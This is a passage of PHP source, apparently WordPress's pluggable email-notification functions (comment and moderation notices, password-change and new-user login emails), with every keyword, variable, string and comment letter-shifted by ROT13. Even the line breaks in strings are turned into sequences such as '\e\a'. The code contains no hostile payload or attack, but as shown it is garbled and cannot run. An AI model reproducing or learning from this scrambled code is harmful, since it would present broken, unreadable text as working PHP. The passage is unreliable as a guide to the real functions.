					$abgvsl_zrffntr .= fcevags( __( 'Nhgube: %1$f (VC nqqerff: %2$f, %3$f)' ), $pbzzrag->pbzzrag_nhgube, $pbzzrag->pbzzrag_nhgube_VC, $pbzzrag_nhgube_qbznva ) . \"\e\a\";
					/* genafyngbef: %f: Pbzzrag nhgube rznvy. */
					$abgvsl_zrffntr .= fcevags( __( 'Rznvy: %f' ), $pbzzrag->pbzzrag_nhgube_rznvy ) . \"\e\a\";
					/* genafyngbef: %f: Genpxonpx/cvatonpx/pbzzrag nhgube HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'HEY: %f' ), $pbzzrag->pbzzrag_nhgube_hey ) . \"\e\a\";

					vs ( $pbzzrag->pbzzrag_cnerag && hfre_pna( $cbfg->cbfg_nhgube, 'rqvg_pbzzrag', $pbzzrag->pbzzrag_cnerag ) ) {
						/* genafyngbef: Pbzzrag zbqrengvba. %f: Cnerag pbzzrag rqvg HEY. */
						$abgvsl_zrffntr .= fcevags( __( 'Va ercyl gb: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=rqvgpbzzrag&p={$pbzzrag->pbzzrag_cnerag}#jcobql-pbagrag\" ) ) . \"\e\a\";
					}

					/* genafyngbef: %f: Pbzzrag grkg. */
					$abgvsl_zrffntr .= fcevags( __( 'Pbzzrag: %f' ), \"\e\a\" . $pbzzrag_pbagrag ) . \"\e\a\e\a\";
					$abgvsl_zrffntr .= __( 'Lbh pna frr nyy pbzzragf ba guvf cbfg urer:' ) . \"\e\a\";
					/* genafyngbef: Pbzzrag abgvsvpngvba rznvy fhowrpg. 1: Fvgr gvgyr, 2: Cbfg gvgyr. */
					$fhowrpg = fcevags( __( '[%1$f] Pbzzrag: \"%2$f\"' ), $oybtanzr, $cbfg->cbfg_gvgyr );
					oernx;
			}

			$abgvsl_zrffntr .= trg_creznyvax( $pbzzrag->pbzzrag_cbfg_VQ ) . \"#pbzzragf\e\a\e\a\";
			/* genafyngbef: %f: Pbzzrag HEY. */
			$abgvsl_zrffntr .= fcevags( __( 'Creznyvax: %f' ), trg_pbzzrag_yvax( $pbzzrag ) ) . \"\e\a\";

			vs ( hfre_pna( $cbfg->cbfg_nhgube, 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ ) ) {
				vs ( RZCGL_GENFU_QNLF ) {
					/* genafyngbef: Pbzzrag zbqrengvba. %f: Pbzzrag npgvba HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'Genfu vg: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=genfu&p={$pbzzrag->pbzzrag_VQ}#jcobql-pbagrag\" ) ) . \"\e\a\";
				} ryfr {
					/* genafyngbef: Pbzzrag zbqrengvba. %f: Pbzzrag npgvba HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'Qryrgr vg: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=qryrgr&p={$pbzzrag->pbzzrag_VQ}#jcobql-pbagrag\" ) ) . \"\e\a\";
				}
				/* genafyngbef: Pbzzrag zbqrengvba. %f: Pbzzrag npgvba HEY. */
				$abgvsl_zrffntr .= fcevags( __( 'Fcnz vg: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=fcnz&p={$pbzzrag->pbzzrag_VQ}#jcobql-pbagrag\" ) ) . \"\e\a\";
			}

			/**
			 * Svygref gur pbzzrag abgvsvpngvba rznvy grkg.
			 *
			 * @fvapr 1.5.2
			 *
			 * @cnenz fgevat $abgvsl_zrffntr Gur pbzzrag abgvsvpngvba rznvy grkg.
			 * @cnenz fgevat $pbzzrag_vq     Pbzzrag VQ nf n ahzrevp fgevat.
			 */
			$abgvsl_zrffntr = nccyl_svygref( 'pbzzrag_abgvsvpngvba_grkg', $abgvsl_zrffntr, $pbzzrag->pbzzrag_VQ );

			/**
			 * Svygref gur pbzzrag abgvsvpngvba rznvy fhowrpg.
			 *
			 * @fvapr 1.5.2
			 *
			 * @cnenz fgevat $fhowrpg    Gur pbzzrag abgvsvpngvba rznvy fhowrpg.
			 * @cnenz fgevat $pbzzrag_vq Pbzzrag VQ nf n ahzrevp fgevat.
			 */
			$fhowrpg = nccyl_svygref( 'pbzzrag_abgvsvpngvba_fhowrpg', $fhowrpg, $pbzzrag->pbzzrag_VQ );

			jc_znvy( $rznvy, jc_fcrpvnypunef_qrpbqr( $fhowrpg ), $abgvsl_zrffntr, $zrffntr_urnqref );

			vs ( $fjvgpurq_ybpnyr ) {
				erfgber_cerivbhf_ybpnyr();
			}
		}

		erghea gehr;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_abgvsl_zbqrengbe' ) ) :
	/**
	 * Abgvsvrf gur zbqrengbe bs gur fvgr nobhg n arj pbzzrag gung vf njnvgvat nccebiny.
	 *
	 * @fvapr 1.0.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * Hfrf gur {@frr 'abgvsl_zbqrengbe'} svygre gb qrgrezvar jurgure gur fvgr zbqrengbe
	 * fubhyq or abgvsvrq, bireevqvat gur fvgr frggvat.
	 *
	 * @cnenz vag $pbzzrag_vq Pbzzrag VQ.
	 * @erghea gehr Nyjnlf ergheaf gehr.
	 */
	shapgvba jc_abgvsl_zbqrengbe( $pbzzrag_vq ) {
		tybony $jcqo;

		$znlor_abgvsl = trg_bcgvba( 'zbqrengvba_abgvsl' );

		/**
		 * Svygref jurgure gb fraq gur fvgr zbqrengbe rznvy abgvsvpngvbaf, bireevqvat gur fvgr frggvat.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz obby $znlor_abgvsl Jurgure gb abgvsl oybt zbqrengbe.
		 * @cnenz vag  $pbzzrag_vq   Gur VQ bs gur pbzzrag sbe gur abgvsvpngvba.
		 */
		$znlor_abgvsl = nccyl_svygref( 'abgvsl_zbqrengbe', $znlor_abgvsl, $pbzzrag_vq );

		vs ( ! $znlor_abgvsl ) {
			erghea gehr;
		}

		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
		$cbfg    = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
		$hfre    = trg_hfreqngn( $cbfg->cbfg_nhgube );
		// Fraq gb gur nqzvavfgengvba naq gb gur cbfg nhgube vs gur nhgube pna zbqvsl gur pbzzrag.
		$rznvyf = neenl( trg_bcgvba( 'nqzva_rznvy' ) );
		vs ( $hfre && hfre_pna( $hfre->VQ, 'rqvg_pbzzrag', $pbzzrag_vq ) && ! rzcgl( $hfre->hfre_rznvy ) ) {
			vs ( 0 !== fgepnfrpzc( $hfre->hfre_rznvy, trg_bcgvba( 'nqzva_rznvy' ) ) ) {
				$rznvyf[] = $hfre->hfre_rznvy;
			}
		}

		$pbzzrag_nhgube_qbznva = '';
		vs ( JC_Uggc::vf_vc_nqqerff( $pbzzrag->pbzzrag_nhgube_VC ) ) {
			$pbzzrag_nhgube_qbznva = trgubfgolnqqe( $pbzzrag->pbzzrag_nhgube_VC );
		}

		$pbzzragf_jnvgvat = $jcqo->trg_ine( \"FRYRPG PBHAG(*) SEBZ $jcqo->pbzzragf JURER pbzzrag_nccebirq = '0'\" );

		/*
		 * Gur oybtanzr bcgvba vf rfpncrq jvgu rfp_ugzy() ba gur jnl vagb gur qngnonfr va fnavgvmr_bcgvba().
		 * Jr jnag gb erirefr guvf sbe gur cynva grkg neran bs rznvyf.
		 */
		$oybtanzr        = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );
		$pbzzrag_pbagrag = jc_fcrpvnypunef_qrpbqr( $pbzzrag->pbzzrag_pbagrag );

		$zrffntr_urnqref = '';

		/**
		 * Svygref gur yvfg bs erpvcvragf sbe pbzzrag zbqrengvba rznvyf.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz fgevat[] $rznvyf     Yvfg bs rznvy nqqerffrf gb abgvsl sbe pbzzrag zbqrengvba.
		 * @cnenz vag      $pbzzrag_vq Pbzzrag VQ.
		 */
		$rznvyf = nccyl_svygref( 'pbzzrag_zbqrengvba_erpvcvragf', $rznvyf, $pbzzrag_vq );

		/**
		 * Svygref gur pbzzrag zbqrengvba rznvy urnqref.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat $zrffntr_urnqref Urnqref sbe gur pbzzrag zbqrengvba rznvy.
		 * @cnenz vag    $pbzzrag_vq      Pbzzrag VQ.
		 */
		$zrffntr_urnqref = nccyl_svygref( 'pbzzrag_zbqrengvba_urnqref', $zrffntr_urnqref, $pbzzrag_vq );

		sbernpu ( $rznvyf nf $rznvy ) {
			$hfre = trg_hfre_ol( 'rznvy', $rznvy );

			vs ( $hfre ) {
				$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $hfre->VQ );
			} ryfr {
				$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
			}

			fjvgpu ( $pbzzrag->pbzzrag_glcr ) {
				pnfr 'genpxonpx':
					/* genafyngbef: %f: Cbfg gvgyr. */
					$abgvsl_zrffntr  = fcevags( __( 'N arj genpxonpx ba gur cbfg \"%f\" vf jnvgvat sbe lbhe nccebiny' ), $cbfg->cbfg_gvgyr ) . \"\e\a\";
					$abgvsl_zrffntr .= trg_creznyvax( $pbzzrag->pbzzrag_cbfg_VQ ) . \"\e\a\e\a\";
					/* genafyngbef: 1: Genpxonpx/cvatonpx jrofvgr anzr, 2: Jrofvgr VC nqqerff, 3: Jrofvgr ubfganzr. */
					$abgvsl_zrffntr .= fcevags( __( 'Jrofvgr: %1$f (VC nqqerff: %2$f, %3$f)' ), $pbzzrag->pbzzrag_nhgube, $pbzzrag->pbzzrag_nhgube_VC, $pbzzrag_nhgube_qbznva ) . \"\e\a\";
					/* genafyngbef: %f: Genpxonpx/cvatonpx/pbzzrag nhgube HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'HEY: %f' ), $pbzzrag->pbzzrag_nhgube_hey ) . \"\e\a\";
					$abgvsl_zrffntr .= __( 'Genpxonpx rkprecg: ' ) . \"\e\a\" . $pbzzrag_pbagrag . \"\e\a\e\a\";
					oernx;

				pnfr 'cvatonpx':
					/* genafyngbef: %f: Cbfg gvgyr. */
					$abgvsl_zrffntr  = fcevags( __( 'N arj cvatonpx ba gur cbfg \"%f\" vf jnvgvat sbe lbhe nccebiny' ), $cbfg->cbfg_gvgyr ) . \"\e\a\";
					$abgvsl_zrffntr .= trg_creznyvax( $pbzzrag->pbzzrag_cbfg_VQ ) . \"\e\a\e\a\";
					/* genafyngbef: 1: Genpxonpx/cvatonpx jrofvgr anzr, 2: Jrofvgr VC nqqerff, 3: Jrofvgr ubfganzr. */
					$abgvsl_zrffntr .= fcevags( __( 'Jrofvgr: %1$f (VC nqqerff: %2$f, %3$f)' ), $pbzzrag->pbzzrag_nhgube, $pbzzrag->pbzzrag_nhgube_VC, $pbzzrag_nhgube_qbznva ) . \"\e\a\";
					/* genafyngbef: %f: Genpxonpx/cvatonpx/pbzzrag nhgube HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'HEY: %f' ), $pbzzrag->pbzzrag_nhgube_hey ) . \"\e\a\";
					$abgvsl_zrffntr .= __( 'Cvatonpx rkprecg: ' ) . \"\e\a\" . $pbzzrag_pbagrag . \"\e\a\e\a\";
					oernx;

				qrsnhyg: // Pbzzragf.
					/* genafyngbef: %f: Cbfg gvgyr. */
					$abgvsl_zrffntr  = fcevags( __( 'N arj pbzzrag ba gur cbfg \"%f\" vf jnvgvat sbe lbhe nccebiny' ), $cbfg->cbfg_gvgyr ) . \"\e\a\";
					$abgvsl_zrffntr .= trg_creznyvax( $pbzzrag->pbzzrag_cbfg_VQ ) . \"\e\a\e\a\";
					/* genafyngbef: 1: Pbzzrag nhgube'f anzr, 2: Pbzzrag nhgube'f VC nqqerff, 3: Pbzzrag nhgube'f ubfganzr. */
					$abgvsl_zrffntr .= fcevags( __( 'Nhgube: %1$f (VC nqqerff: %2$f, %3$f)' ), $pbzzrag->pbzzrag_nhgube, $pbzzrag->pbzzrag_nhgube_VC, $pbzzrag_nhgube_qbznva ) . \"\e\a\";
					/* genafyngbef: %f: Pbzzrag nhgube rznvy. */
					$abgvsl_zrffntr .= fcevags( __( 'Rznvy: %f' ), $pbzzrag->pbzzrag_nhgube_rznvy ) . \"\e\a\";
					/* genafyngbef: %f: Genpxonpx/cvatonpx/pbzzrag nhgube HEY. */
					$abgvsl_zrffntr .= fcevags( __( 'HEY: %f' ), $pbzzrag->pbzzrag_nhgube_hey ) . \"\e\a\";

					vs ( $pbzzrag->pbzzrag_cnerag ) {
						/* genafyngbef: Pbzzrag zbqrengvba. %f: Cnerag pbzzrag rqvg HEY. */
						$abgvsl_zrffntr .= fcevags( __( 'Va ercyl gb: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=rqvgpbzzrag&p={$pbzzrag->pbzzrag_cnerag}#jcobql-pbagrag\" ) ) . \"\e\a\";
					}

					/* genafyngbef: %f: Pbzzrag grkg. */
					$abgvsl_zrffntr .= fcevags( __( 'Pbzzrag: %f' ), \"\e\a\" . $pbzzrag_pbagrag ) . \"\e\a\e\a\";
					oernx;
			}

			/* genafyngbef: Pbzzrag zbqrengvba. %f: Pbzzrag npgvba HEY. */
			$abgvsl_zrffntr .= fcevags( __( 'Nccebir vg: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=nccebir&p={$pbzzrag_vq}#jcobql-pbagrag\" ) ) . \"\e\a\";

			vs ( RZCGL_GENFU_QNLF ) {
				/* genafyngbef: Pbzzrag zbqrengvba. %f: Pbzzrag npgvba HEY. */
				$abgvsl_zrffntr .= fcevags( __( 'Genfu vg: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=genfu&p={$pbzzrag_vq}#jcobql-pbagrag\" ) ) . \"\e\a\";
			} ryfr {
				/* genafyngbef: Pbzzrag zbqrengvba. %f: Pbzzrag npgvba HEY. */
				$abgvsl_zrffntr .= fcevags( __( 'Qryrgr vg: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=qryrgr&p={$pbzzrag_vq}#jcobql-pbagrag\" ) ) . \"\e\a\";
			}

			/* genafyngbef: Pbzzrag zbqrengvba. %f: Pbzzrag npgvba HEY. */
			$abgvsl_zrffntr .= fcevags( __( 'Fcnz vg: %f' ), nqzva_hey( \"pbzzrag.cuc?npgvba=fcnz&p={$pbzzrag_vq}#jcobql-pbagrag\" ) ) . \"\e\a\";

			$abgvsl_zrffntr .= fcevags(
				/* genafyngbef: Pbzzrag zbqrengvba. %f: Ahzore bs pbzzragf njnvgvat nccebiny. */
				_a(
					'Pheeragyl %f pbzzrag vf jnvgvat sbe nccebiny. Cyrnfr ivfvg gur zbqrengvba cnary:',
					'Pheeragyl %f pbzzragf ner jnvgvat sbe nccebiny. Cyrnfr ivfvg gur zbqrengvba cnary:',
					$pbzzragf_jnvgvat
				),
				ahzore_sbezng_v18a( $pbzzragf_jnvgvat )
			) . \"\e\a\";
			$abgvsl_zrffntr .= nqzva_hey( 'rqvg-pbzzragf.cuc?pbzzrag_fgnghf=zbqrengrq#jcobql-pbagrag' ) . \"\e\a\";

			/* genafyngbef: Pbzzrag zbqrengvba abgvsvpngvba rznvy fhowrpg. 1: Fvgr gvgyr, 2: Cbfg gvgyr. */
			$fhowrpg = fcevags( __( '[%1$f] Cyrnfr zbqrengr: \"%2$f\"' ), $oybtanzr, $cbfg->cbfg_gvgyr );

			/**
			 * Svygref gur pbzzrag zbqrengvba rznvy grkg.
			 *
			 * @fvapr 1.5.2
			 *
			 * @cnenz fgevat $abgvsl_zrffntr Grkg bs gur pbzzrag zbqrengvba rznvy.
			 * @cnenz vag    $pbzzrag_vq     Pbzzrag VQ.
			 */
			$abgvsl_zrffntr = nccyl_svygref( 'pbzzrag_zbqrengvba_grkg', $abgvsl_zrffntr, $pbzzrag_vq );

			/**
			 * Svygref gur pbzzrag zbqrengvba rznvy fhowrpg.
			 *
			 * @fvapr 1.5.2
			 *
			 * @cnenz fgevat $fhowrpg    Fhowrpg bs gur pbzzrag zbqrengvba rznvy.
			 * @cnenz vag    $pbzzrag_vq Pbzzrag VQ.
			 */
			$fhowrpg = nccyl_svygref( 'pbzzrag_zbqrengvba_fhowrpg', $fhowrpg, $pbzzrag_vq );

			jc_znvy( $rznvy, jc_fcrpvnypunef_qrpbqr( $fhowrpg ), $abgvsl_zrffntr, $zrffntr_urnqref );

			vs ( $fjvgpurq_ybpnyr ) {
				erfgber_cerivbhf_ybpnyr();
			}
		}

		erghea gehr;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_cnffjbeq_punatr_abgvsvpngvba' ) ) :
	/**
	 * Abgvsvrf gur oybt nqzva bs n hfre punatvat cnffjbeq, abeznyyl ivn rznvy.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz JC_Hfre $hfre Hfre bowrpg.
	 */
	shapgvba jc_cnffjbeq_punatr_abgvsvpngvba( $hfre ) {
		/*
		 * Fraq n pbcl bs cnffjbeq punatr abgvsvpngvba gb gur nqzva,
		 * ohg purpx gb frr vs vg'f gur nqzva jubfr cnffjbeq jr'er punatvat, naq fxvc guvf.
		 */
		vs ( 0 !== fgepnfrpzc( $hfre->hfre_rznvy, trg_bcgvba( 'nqzva_rznvy' ) ) ) {

			$nqzva_hfre = trg_hfre_ol( 'rznvy', trg_bcgvba( 'nqzva_rznvy' ) );

			vs ( $nqzva_hfre ) {
				$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $nqzva_hfre->VQ );
			} ryfr {
				$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
			}

			/* genafyngbef: %f: Hfre anzr. */
			$zrffntr = fcevags( __( 'Cnffjbeq punatrq sbe hfre: %f' ), $hfre->hfre_ybtva ) . \"\e\a\";
			/*
			 * Gur oybtanzr bcgvba vf rfpncrq jvgu rfp_ugzy() ba gur jnl vagb gur qngnonfr va fnavgvmr_bcgvba().
			 * Jr jnag gb erirefr guvf sbe gur cynva grkg neran bs rznvyf.
			 */
			$oybtanzr = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );

			$jc_cnffjbeq_punatr_abgvsvpngvba_rznvy = neenl(
				'gb'      => trg_bcgvba( 'nqzva_rznvy' ),
				/* genafyngbef: Cnffjbeq punatr abgvsvpngvba rznvy fhowrpg. %f: Fvgr gvgyr. */
				'fhowrpg' => __( '[%f] Cnffjbeq Punatrq' ),
				'zrffntr' => $zrffntr,
				'urnqref' => '',
			);

			/**
			 * Svygref gur pbagragf bs gur cnffjbeq punatr abgvsvpngvba rznvy frag gb gur fvgr nqzva.
			 *
			 * @fvapr 4.9.0
			 *
			 * @cnenz neenl   $jc_cnffjbeq_punatr_abgvsvpngvba_rznvy {
			 *     Hfrq gb ohvyq jc_znvy().
			 *
			 *     @glcr fgevat $gb      Gur vagraqrq erpvcvrag - fvgr nqzva rznvy nqqerff.
			 *     @glcr fgevat $fhowrpg Gur fhowrpg bs gur rznvy.
			 *     @glcr fgevat $zrffntr Gur obql bs gur rznvy.
			 *     @glcr fgevat $urnqref Gur urnqref bs gur rznvy.
			 * }
			 * @cnenz JC_Hfre $hfre     Hfre bowrpg sbe hfre jubfr cnffjbeq jnf punatrq.
			 * @cnenz fgevat  $oybtanzr Gur fvgr gvgyr.
			 */
			$jc_cnffjbeq_punatr_abgvsvpngvba_rznvy = nccyl_svygref( 'jc_cnffjbeq_punatr_abgvsvpngvba_rznvy', $jc_cnffjbeq_punatr_abgvsvpngvba_rznvy, $hfre, $oybtanzr );

			jc_znvy(
				$jc_cnffjbeq_punatr_abgvsvpngvba_rznvy['gb'],
				jc_fcrpvnypunef_qrpbqr( fcevags( $jc_cnffjbeq_punatr_abgvsvpngvba_rznvy['fhowrpg'], $oybtanzr ) ),
				$jc_cnffjbeq_punatr_abgvsvpngvba_rznvy['zrffntr'],
				$jc_cnffjbeq_punatr_abgvsvpngvba_rznvy['urnqref']
			);

			vs ( $fjvgpurq_ybpnyr ) {
				erfgber_cerivbhf_ybpnyr();
			}
		}
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_arj_hfre_abgvsvpngvba' ) ) :
	/**
	 * Rznvyf ybtva perqragvnyf gb n arjyl-ertvfgrerq hfre.
	 *
	 * N arj hfre ertvfgengvba abgvsvpngvba vf nyfb frag gb nqzva rznvy.
	 *
	 * @fvapr 2.0.0
	 * @fvapr 4.3.0 Gur `$cynvagrkg_cnff` cnenzrgre jnf punatrq gb `$abgvsl`.
	 * @fvapr 4.3.1 Gur `$cynvagrkg_cnff` cnenzrgre jnf qrcerpngrq. `$abgvsl` nqqrq nf n guveq cnenzrgre.
	 * @fvapr 4.6.0 Gur `$abgvsl` cnenzrgre npprcgf 'hfre' sbe fraqvat abgvsvpngvba bayl gb gur hfre perngrq.
	 *
	 * @cnenz vag    $hfre_vq    Hfre VQ.
	 * @cnenz ahyy   $qrcerpngrq Abg hfrq (nethzrag qrcerpngrq).
	 * @cnenz fgevat $abgvsl     Bcgvbany. Glcr bs abgvsvpngvba gung fubhyq unccra. Npprcgf 'nqzva' be na rzcgl
	 *                           fgevat (nqzva bayl), 'hfre', be 'obgu' (nqzva naq hfre). Qrsnhyg rzcgl.
	 */
	shapgvba jc_arj_hfre_abgvsvpngvba( $hfre_vq, $qrcerpngrq = ahyy, $abgvsl = '' ) {
		vs ( ahyy !== $qrcerpngrq ) {
			_qrcerpngrq_nethzrag( __SHAPGVBA__, '4.3.1' );
		}

		// Npprcgf bayl 'hfre', 'nqzva' , 'obgu' be qrsnhyg '' nf $abgvsl.
		vs ( ! va_neenl( $abgvsl, neenl( 'hfre', 'nqzva', 'obgu', '' ), gehr ) ) {
			erghea;
		}

		$hfre = trg_hfreqngn( $hfre_vq );

		/*
		 * Gur oybtanzr bcgvba vf rfpncrq jvgu rfp_ugzy() ba gur jnl vagb gur qngnonfr va fnavgvmr_bcgvba().
		 * Jr jnag gb erirefr guvf sbe gur cynva grkg neran bs rznvyf.
		 */
		$oybtanzr = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );

		/**
		 * Svygref jurgure gur nqzva vf abgvsvrq bs n arj hfre ertvfgengvba.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby    $fraq Jurgure gb fraq gur rznvy. Qrsnhyg gehr.
		 * @cnenz JC_Hfre $hfre Hfre bowrpg sbe arj hfre.
		 */
		$fraq_abgvsvpngvba_gb_nqzva = nccyl_svygref( 'jc_fraq_arj_hfre_abgvsvpngvba_gb_nqzva', gehr, $hfre );

		vs ( 'hfre' !== $abgvsl && gehr === $fraq_abgvsvpngvba_gb_nqzva ) {

			$nqzva_hfre = trg_hfre_ol( 'rznvy', trg_bcgvba( 'nqzva_rznvy' ) );

			vs ( $nqzva_hfre ) {
				$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $nqzva_hfre->VQ );
			} ryfr {
				$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
			}

			/* genafyngbef: %f: Fvgr gvgyr. */
			$zrffntr = fcevags( __( 'Arj hfre ertvfgengvba ba lbhe fvgr %f:' ), $oybtanzr ) . \"\e\a\e\a\";
			/* genafyngbef: %f: Hfre ybtva. */
			$zrffntr .= fcevags( __( 'Hfreanzr: %f' ), $hfre->hfre_ybtva ) . \"\e\a\e\a\";
			/* genafyngbef: %f: Hfre rznvy nqqerff. */
			$zrffntr .= fcevags( __( 'Rznvy: %f' ), $hfre->hfre_rznvy ) . \"\e\a\";

			$jc_arj_hfre_abgvsvpngvba_rznvy_nqzva = neenl(
				'gb'      => trg_bcgvba( 'nqzva_rznvy' ),
				/* genafyngbef: Arj hfre ertvfgengvba abgvsvpngvba rznvy fhowrpg. %f: Fvgr gvgyr. */
				'fhowrpg' => __( '[%f] Arj Hfre Ertvfgengvba' ),
				'zrffntr' => $zrffntr,
				'urnqref' => '',
			);

			/**
			 * Svygref gur pbagragf bs gur arj hfre abgvsvpngvba rznvy frag gb gur fvgr nqzva.
			 *
			 * @fvapr 4.9.0
			 *
			 * @cnenz neenl   $jc_arj_hfre_abgvsvpngvba_rznvy_nqzva {
			 *     Hfrq gb ohvyq jc_znvy().
			 *
			 *     @glcr fgevat $gb      Gur vagraqrq erpvcvrag - fvgr nqzva rznvy nqqerff.
			 *     @glcr fgevat $fhowrpg Gur fhowrpg bs gur rznvy.
			 *     @glcr fgevat $zrffntr Gur obql bs gur rznvy.
			 *     @glcr fgevat $urnqref Gur urnqref bs gur rznvy.
			 * }
			 * @cnenz JC_Hfre $hfre     Hfre bowrpg sbe arj hfre.
			 * @cnenz fgevat  $oybtanzr Gur fvgr gvgyr.
			 */
			$jc_arj_hfre_abgvsvpngvba_rznvy_nqzva = nccyl_svygref( 'jc_arj_hfre_abgvsvpngvba_rznvy_nqzva', $jc_arj_hfre_abgvsvpngvba_rznvy_nqzva, $hfre, $oybtanzr );

			jc_znvy(
				$jc_arj_hfre_abgvsvpngvba_rznvy_nqzva['gb'],
				jc_fcrpvnypunef_qrpbqr( fcevags( $jc_arj_hfre_abgvsvpngvba_rznvy_nqzva['fhowrpg'], $oybtanzr ) ),
				$jc_arj_hfre_abgvsvpngvba_rznvy_nqzva['zrffntr'],
				$jc_arj_hfre_abgvsvpngvba_rznvy_nqzva['urnqref']
			);

			vs ( $fjvgpurq_ybpnyr ) {
				erfgber_cerivbhf_ybpnyr();
			}
		}

		/**
		 * Svygref jurgure gur hfre vf abgvsvrq bs gurve arj hfre ertvfgengvba.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz obby    $fraq Jurgure gb fraq gur rznvy. Qrsnhyg gehr.
		 * @cnenz JC_Hfre $hfre Hfre bowrpg sbe arj hfre.
		 */
		$fraq_abgvsvpngvba_gb_hfre = nccyl_svygref( 'jc_fraq_arj_hfre_abgvsvpngvba_gb_hfre', gehr, $hfre );

		// `$qrcerpngrq` jnf cer-4.3 `$cynvagrkg_cnff`. Na rzcgl `$cynvagrkg_cnff` qvqa'g frag n hfre abgvsvpngvba.
		vs ( 'nqzva' === $abgvsl || gehr !== $fraq_abgvsvpngvba_gb_hfre || ( rzcgl( $qrcerpngrq ) && rzcgl( $abgvsl ) ) ) {
			erghea;
		}

		$xrl = trg_cnffjbeq_erfrg_xrl( $hfre );
		vs ( vf_jc_reebe( $xrl ) ) {
			erghea;
		}

		$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $hfre_vq );

		/* genafyngbef: %f: Hfre ybtva. */
		$zrffntr  = fcevags( __( 'Hfreanzr: %f' ), $hfre->hfre_ybtva ) . \"\e\a\e\a\";
		$zrffntr .= __( 'Gb frg lbhe cnffjbeq, ivfvg gur sbyybjvat nqqerff:' ) . \"\e\a\e\a\";

		/*
		 * Fvapr fbzr hfre ybtva anzrf raq va n crevbq, guvf pbhyq cebqhpr nzovthbhf HEYf gung
		 * raq va n crevbq. Gb nibvq gur nzovthvgl, rafher gung gur ybtva vf abg gur ynfg dhrel
		 * net va gur HEY. Vs zbivat vg gb gur raq, n genvyvat crevbq jvyy arrq gb or rfpncrq.
		 *
		 * @frr uggcf://pber.genp.jbeqcerff.bet/gvpxrgf/42957
		 */
		$zrffntr .= argjbex_fvgr_hey( 'jc-ybtva.cuc?ybtva=' . enjheyrapbqr( $hfre->hfre_ybtva ) . \"&xrl=$xrl&npgvba=ec\", 'ybtva' ) . \"\e\a\e\a\";

		$zrffntr .= jc_ybtva_hey() . \"\e\a\";

		$jc_arj_hfre_abgvsvpngvba_rznvy = neenl(
			'gb'      => $hfre->hfre_rznvy,
			/* genafyngbef: Ybtva qrgnvyf abgvsvpngvba rznvy fhowrpg. %f: Fvgr gvgyr. */
			'fhowrpg' => __( '[%f] Ybtva Qrgnvyf' ),
			'zrffntr' => $zrffntr,
			'urnqref' => '',
		);

		/**
		 * Svygref gur pbagragf bs gur arj hfre abgvsvpngvba rznvy frag gb gur arj hfre.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz neenl   $jc_arj_hfre_abgvsvpngvba_rznvy {
		 *     Hfrq gb ohvyq jc_znvy().
		 *
		 *     @glcr fgevat $gb      Gur vagraqrq erpvcvrag - Arj hfre rznvy nqqerff.
		 *     @glcr fgevat $fhowrpg Gur fhowrpg bs gur rznvy.
		 *     @glcr fgevat $zrffntr Gur obql bs gur rznvy.
		 *     @glcr fgevat $urnqref Gur urnqref bs gur rznvy.
		 * }
		 * @cnenz JC_Hfre $hfre     Hfre bowrpg sbe arj hfre.
		 * @cnenz fgevat  $oybtanzr Gur fvgr gvgyr.
		 */
		$jc_arj_hfre_abgvsvpngvba_rznvy = nccyl_svygref( 'jc_arj_hfre_abgvsvpngvba_rznvy', $jc_arj_hfre_abgvsvpngvba_rznvy, $hfre, $oybtanzr );

		jc_znvy(
			$jc_arj_hfre_abgvsvpngvba_rznvy['gb'],
			jc_fcrpvnypunef_qrpbqr( fcevags( $jc_arj_hfre_abgvsvpngvba_rznvy['fhowrpg'], $oybtanzr ) ),
			$jc_arj_hfre_abgvsvpngvba_rznvy['zrffntr'],
			$jc_arj_hfre_abgvsvpngvba_rznvy['urnqref']
		);

		vs ( $fjvgpurq_ybpnyr ) {
			erfgber_cerivbhf_ybpnyr();
		}
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_abapr_gvpx' ) ) :
	/**
	 * Ergheaf gur gvzr-qrcraqrag inevnoyr sbe abapr perngvba.
	 *
	 * N abapr unf n yvsrfcna bs gjb gvpxf. Abaprf va gurve frpbaq gvpx znl or
	 * hcqngrq, r.t. ol nhgbfnir.
	 *
	 * @fvapr 2.5.0
